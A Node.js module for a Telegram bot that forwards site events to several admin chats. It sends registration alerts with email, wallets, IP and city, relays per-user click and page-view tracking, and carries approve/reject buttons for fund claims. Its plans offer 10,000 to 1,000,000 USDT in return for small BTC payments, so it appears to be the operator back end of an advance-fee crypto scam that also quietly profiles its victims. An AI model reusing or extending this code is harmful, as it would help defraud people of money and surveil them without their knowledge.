const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const ADMIN_CHAT_ID   = process.env.TELEGRAM_ADMIN_CHAT_ID;
const ADMIN_CHAT_ID_2 = process.env.TELEGRAM_ADMIN_CHAT_ID_2;
const ADMIN_CHAT_ID_3 = process.env.TELEGRAM_ADMIN_CHAT_ID_3;
const TEMPLATE_VERSION = 'v2.6';

let bot;
let commandsRegistered = false;
function getBot() {
  if (!bot) {
    bot = new TelegramBot(BOT_TOKEN, { polling: false });
  }

  if (!commandsRegistered && bot) {
    commandsRegistered = true;
    bot.setMyCommands([
      { command: 'start', description: 'Open the control menu' },
      { command: 'help', description: 'View all command details' },
      { command: 'ping', description: 'Check bot online status' },
      { command: 'status', description: 'View admin live metrics' },
      { command: 'flush', description: 'Send telemetry summary now' },
    ]).catch((err) => {
      commandsRegistered = false;
      console.error('setMyCommands error:', err && err.message ? err.message : err);
    });
  }

  return bot;
}

const PLAN_LABELS = {
  '10k':  '10,000 USDT  — $100 BTC',
  '500k': '500,000 USDT — $500 BTC',
  '1m':   '1,000,000 USDT — $1,000 BTC',
};

function getTargetChatIds() {
  return Array.from(new Set([CHAT_ID, ADMIN_CHAT_ID, ADMIN_CHAT_ID_2, ADMIN_CHAT_ID_3].filter(Boolean)));
}

async function broadcastMessage(text, options) {
  const b = getBot();
  const targets = getTargetChatIds();
  if (!targets.length) {
    throw new Error('No TELEGRAM_CHAT_ID or TELEGRAM_ADMIN_CHAT_ID configured');
  }
  await Promise.all(targets.map((chatId) => b.sendMessage(chatId, text, options || {})));
}

async function notifyNewRegistration(user) {
  const date = new Date().toISOString().replace('T', ' ').slice(0, 16) + ' UTC';
  const wallet = user.tronAddress || 'not provided yet';
  const registrationIp = user.registrationIp || 'unknown';
  const registrationLocation = user.registrationLocation || user.registrationCity || 'Unknown';

  const text =
    `📝 Nouvelle inscription [${TEMPLATE_VERSION}]\n` +
    `• Email: ${user.email}\n` +
    `• Wallet: ${wallet}\n` +
    `• IP: ${registrationIp}\n` +
    `• Ville: ${registrationLocation}\n` +
    `• Plan: ${PLAN_LABELS[user.accountType]}\n` +
    `• BTC: ${user.btcAddress}\n` +
    `• Ref: ${user.paymentRef || '—'}\n` +
    `• Date: ${date}`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve & Send USDT', callback_data: `approve_${user._id}` },
      { text: '❌ Reject',              callback_data: `reject_${user._id}` },
    ]],
  };

  await broadcastMessage(text, {
    disable_web_page_preview: true,
    reply_markup: keyboard,
  });
}

async function sendMessage(text) {
  const b = getBot();
  await b.sendMessage(CHAT_ID, text, { parse_mode: 'Markdown' });
}

async function sendPlainMessage(chatId, text) {
  const b = getBot();
  await b.sendMessage(chatId || CHAT_ID, String(text || ''), {
    disable_web_page_preview: true,
  });
}

async function getWebhookInfo() {
  const b = getBot();
  return b.getWebHookInfo();
}

async function setWebhook(url) {
  const b = getBot();
  return b.setWebHook(url);
}

async function sendTrackingEvent(event) {
  const eventIconMap = {
    page_view: '🌐',
    click: '🖱️',
    form_submit: '📝',
    wallet_action: '💼',
    auth_action: '🔐',
    js_error: '⚠️',
  };

  const icon = eventIconMap[event.eventType] || '📌';
  const who = event.email || event.userId || 'guest';
  const email = event.email || 'unknown';
  const wallet = event.wallet || event.tronAddress || 'unknown';
  const location = event.location || event.city || 'Unknown';
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';

  const text =
    `${icon} Activity ${event.eventType} [${TEMPLATE_VERSION}]\n` +
    `• Email: ${email}\n` +
    `• Wallet: ${wallet}\n` +
    `• IP: ${event.ip}\n` +
    `• Ville: ${location}\n` +
    `• Page: ${event.page}\n` +
    `• Action: ${event.action || '—'}\n` +
    `• Détails: ${event.details || '—'}\n` +
    `• User: ${who}\n` +
    `• Session: ${event.sessionId}\n` +
    `• Time: ${now}`;

  await broadcastMessage(text, {
    disable_web_page_preview: true,
  });
}

async function sendTrackingSummary(summary) {
  const start = new Date(summary.startTs || Date.now()).toISOString().replace('T', ' ').slice(0, 19);
  const end = new Date(summary.endTs || Date.now()).toISOString().replace('T', ' ').slice(0, 19);

  const lines = (summary.compact || []).slice(0, 12).map((item, idx) => {
    const users = item.users && item.users.length ? item.users.join(', ') : 'guest';
    return `${idx + 1}) ${item.eventType} x${item.count} | ${item.action || 'action'} | ${item.page} | ${users}`;
  });

  const text =
    `📊 Summary 30s [${TEMPLATE_VERSION}]\n` +
    `• ${start} -> ${end} UTC\n` +
    `• Events: ${summary.totalEvents || 0}\n` +
    `• Top:\n` +
    `${lines.join('\n') || 'Aucune action groupée'}`;

  await broadcastMessage(text, {
    disable_web_page_preview: true,
  });
}

async function answerCallbackQuery(callbackQueryId, text) {
  const b = getBot();
  await b.answerCallbackQuery(callbackQueryId, { text });
}

async function editMessageText(chatId, messageId, text) {
  const b = getBot();
  await b.editMessageText(text, {
    chat_id: chatId,
    message_id: messageId,
  });
}

async function notifyClaimRequest(user, planAmount) {
  const date = new Date().toISOString().replace('T', ' ').slice(0, 16) + ' UTC';
  const planLabel = PLAN_LABELS[user.accountType] || user.accountType;

  const text =
    `💰 Demande de fonds [${TEMPLATE_VERSION}]\n` +
    `• Email: ${user.email}\n` +
    `• Plan: ${planLabel}\n` +
    `• Montant: ${planAmount.toLocaleString()} USDT\n` +
    `• Wallet TRON: ${user.tronAddress || 'non configuré'}\n` +
    `• Date: ${date}`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approuver & Créditer', callback_data: `approve_claim_${user._id}` },
      { text: '❌ Rejeter',              callback_data: `reject_claim_${user._id}` },
    ]],
  };

  await broadcastMessage(text, {
    disable_web_page_preview: true,
    reply_markup: keyboard,
  });
}

module.exports = {
  notifyNewRegistration,
  notifyClaimRequest,
  sendMessage,
  sendPlainMessage,
  getWebhookInfo,
  setWebhook,
  sendTrackingEvent,
  sendTrackingSummary,
  answerCallbackQuery,
  editMessageText,
  getBot,
};
